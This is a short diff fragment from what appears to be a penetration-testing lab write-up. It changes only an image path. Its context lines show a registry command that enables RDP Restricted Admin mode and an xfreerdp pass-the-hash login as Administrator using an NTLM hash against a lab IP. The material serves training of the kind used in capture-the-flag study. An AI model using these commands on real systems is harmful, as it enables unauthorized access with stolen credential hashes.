@@ -62,7 +62,7 @@ Connect via RDP with the Administrator account and submit the flag.txt as you an
 
 1. `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
 2. `xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /dynamic-resolution`
-3. ![](<../../.gitbook/assets/image (8) (1).png>)
+3. ![](<../../.gitbook/assets/image (8) (1) (1).png>)
 
 ### DNS
 
